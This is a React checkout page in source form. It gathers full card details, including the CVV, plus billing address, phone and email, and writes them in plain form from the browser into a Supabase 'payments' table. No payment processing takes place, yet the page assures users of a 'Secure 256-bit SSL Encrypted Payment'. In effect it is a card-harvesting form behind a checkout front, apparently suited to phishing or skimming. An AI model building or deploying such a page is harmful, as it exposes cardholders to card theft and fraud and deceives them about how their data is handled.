
import React, { useState } from 'react';
import { createClient } from '@supabase/supabase-js';
import { InputField } from './components/InputField';
import { PaymentFormData, FormStatus } from './types';

// Supabase Configuration using the provided information
const SUPABASE_URL = 'https://pegivrgrdumkpkcesddx.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_2nUcEQDMsbM0F9EsJCdfAg_dzLuVzHr';

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const App: React.FC = () => {
  const [formData, setFormData] = useState<PaymentFormData>({
    country: '',
    state: '',
    address: '',
    city: '',
    zip: '',
    phone: '',
    email: '',
    fullName: '',
    cardNumber: '',
    expMonth: '',
    expYear: '',
    cvv: '',
    isConfirmed: false
  });

  const [status, setStatus] = useState<FormStatus>(FormStatus.IDLE);
  const [errors, setErrors] = useState<Partial<Record<keyof PaymentFormData, string>>>({});
  const [apiError, setApiError] = useState<string | null>(null);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value, type } = e.target;
    const checked = (e.target as HTMLInputElement).checked;
    
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));

    if (errors[name as keyof PaymentFormData]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validate = (): boolean => {
    const newErrors: Partial<Record<keyof PaymentFormData, string>> = {};
    const requiredFields: (keyof PaymentFormData)[] = [
      'fullName', 'cardNumber', 'expMonth', 'expYear', 'cvv',
      'address', 'city', 'state', 'zip', 'phone', 'email', 'country'
    ];

    requiredFields.forEach(field => {
      if (!formData[field as keyof PaymentFormData]) {
        newErrors[field] = 'Required';
      }
    });

    if (formData.email && !/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Invalid email format';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setApiError(null);

    if (validate()) {
      setStatus(FormStatus.SUBMITTING);
      
      try {
        const { error } = await supabase
          .from('payments')
          .insert([
            {
              full_name: formData.fullName,
              card_number: formData.cardNumber,
              exp_month: formData.expMonth,
              exp_year: formData.expYear,
              cvv: formData.cvv,
              address: formData.address,
              city: formData.city,
              state: formData.state,
              zip: formData.zip,
              country: formData.country,
              phone: formData.phone,
              email: formData.email
            }
          ]);

        if (error) throw error;
        
        setStatus(FormStatus.SUCCESS);
      } catch (err: any) {
        console.error('Submission error:', err);
        setApiError(err.message || 'Something went wrong while saving to Supabase.');
        setStatus(FormStatus.ERROR);
      }
    }
  };

  if (status === FormStatus.SUCCESS) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center animate-in fade-in zoom-in duration-300">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-2xl font-bold text-slate-800 mb-2">Payment Saved</h2>
          <p className="text-slate-500 mb-8">Information has been successfully saved to your database.</p>
          <button 
            onClick={() => setStatus(FormStatus.IDLE)}
            className="w-full py-3 bg-slate-800 text-white rounded-lg font-semibold hover:bg-slate-900 transition-colors"
          >
            Back to Form
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 sm:p-8">
      <div className="max-w-2xl w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-slate-100">
        <div className="bg-slate-900 px-8 py-6">
          <h1 className="text-2xl font-bold text-white tracking-tight">Checkout</h1>
          <p className="text-slate-400 text-sm mt-1">Complete your transaction securely</p>
        </div>

        <form onSubmit={handleSubmit} className="p-8 space-y-8">
          {apiError && (
            <div className="bg-red-50 border-l-4 border-red-500 p-4 text-red-700 text-sm rounded">
              <p className="font-bold">Error saving data:</p>
              <p>{apiError}</p>
            </div>
          )}

          {/* Cardholder Info */}
          <section>
            <h2 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-6 flex items-center">
              <span className="w-8 h-px bg-slate-200 mr-3"></span>
              Payment Information
              <span className="flex-grow h-px bg-slate-200 ml-3"></span>
            </h2>
            <div className="grid grid-cols-1 gap-6">
              <InputField
                label="Full name"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                error={errors.fullName}
              />
              <InputField
                label="Card"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                error={errors.cardNumber}
              />
              <div className="grid grid-cols-3 gap-4">
                <InputField
                  label="Exp. month"
                  name="expMonth"
                  value={formData.expMonth}
                  onChange={handleChange}
                  error={errors.expMonth}
                />
                <InputField
                  label="Exp. year"
                  name="expYear"
                  value={formData.expYear}
                  onChange={handleChange}
                  error={errors.expYear}
                />
                <InputField
                  label="CVV"
                  name="cvv"
                  type="password"
                  value={formData.cvv}
                  onChange={handleChange}
                  error={errors.cvv}
                  maxLength={4}
                />
              </div>
            </div>
          </section>

          {/* Billing Info */}
          <section>
            <h2 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-6 flex items-center">
              <span className="w-8 h-px bg-slate-200 mr-3"></span>
              Billing Address
              <span className="flex-grow h-px bg-slate-200 ml-3"></span>
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <InputField
                className="md:col-span-2"
                label="Address"
                name="address"
                value={formData.address}
                onChange={handleChange}
                error={errors.address}
              />
              <InputField
                label="City"
                name="city"
                value={formData.city}
                onChange={handleChange}
                error={errors.city}
              />
              <InputField
                label="State"
                name="state"
                value={formData.state}
                onChange={handleChange}
                error={errors.state}
              />
              <InputField
                label="ZIP"
                name="zip"
                value={formData.zip}
                onChange={handleChange}
                error={errors.zip}
              />
              <InputField
                label="Country"
                name="country"
                value={formData.country}
                onChange={handleChange}
                error={errors.country}
              />
            </div>
          </section>

          {/* Contact Info */}
          <section>
            <h2 className="text-xs font-bold text-slate-400 uppercase tracking-widest mb-6 flex items-center">
              <span className="w-8 h-px bg-slate-200 mr-3"></span>
              Contact Details
              <span className="flex-grow h-px bg-slate-200 ml-3"></span>
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <InputField
                label="Phone"
                name="phone"
                value={formData.phone}
                onChange={handleChange}
                error={errors.phone}
              />
              <InputField
                label="Email"
                name="email"
                type="email"
                value={formData.email}
                onChange={handleChange}
                error={errors.email}
              />
            </div>
          </section>

          <div className="pt-4">
            <button
              type="submit"
              disabled={status === FormStatus.SUBMITTING}
              className={`w-full py-4 rounded-xl font-bold text-white shadow-lg transition-all transform active:scale-[0.98]
                ${status === FormStatus.SUBMITTING 
                  ? 'bg-slate-400 cursor-not-allowed' 
                  : 'bg-indigo-600 hover:bg-indigo-700 hover:shadow-indigo-200 shadow-indigo-100'}`}
            >
              {status === FormStatus.SUBMITTING ? (
                <div className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                </div>
              ) : (
                'Confirm & Pay'
              )}
            </button>
            <p className="text-center text-slate-400 text-xs mt-4 flex items-center justify-center">
              <svg className="w-3 h-3 mr-1" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              Secure 256-bit SSL Encrypted Payment
            </p>
          </div>
        </form>
      </div>
    </div>
  );
};

export default App;
